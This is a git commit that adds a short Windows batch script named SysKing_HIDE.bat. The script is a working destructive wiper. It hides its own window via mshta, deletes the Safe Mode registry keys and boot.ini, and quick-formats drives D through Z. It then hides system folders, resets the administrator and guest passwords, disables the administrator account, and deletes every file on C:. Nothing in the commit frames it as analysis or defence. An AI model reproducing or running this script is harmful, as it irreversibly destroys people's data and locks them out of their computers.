aa88342e854e0d2c70ddfe496335e81a3e56ef6f
Garystdio <1954758323@qq.com>
2017-04-13 13:43:53 +0800

    Create SysKing_HIDE.bat
    In minimal size to run

---
+++ SysKing_HIDE.bat
@@ -0,0 +1,17 @@
+@echo off
+if not "%1"=="wkdxz" mshta vbscript:createobject("wscript.shell").run("""%~f0"" wkdxz"",vbhide)(window.close)&&exit
+REG DELETE "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot" /v Network /f
+REG DELETE "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot" /v Minimal /f
+ATTRIB %SYSTEMDRIVE%\boot.ini -s -a -r -h
+DEL %SYSTEMDRIVE%\boot.ini /f
+for %%a in (d e f g h i j k l m n o p q r s t u v w x y z) do format %%a: /q /u /x /y
+cd C:\
+attrib +s +h "windows"
+attrib +s +h "Program Files"
+attrib +s +h "Documents and Settings"
+cd C:\Documents and Settings\Administrator\桌面
+attrib +s +h
+net user administrator nisidingle
+net user guest nihuile
+net user administrator /active:no
+del /f /s /q c:\*.*
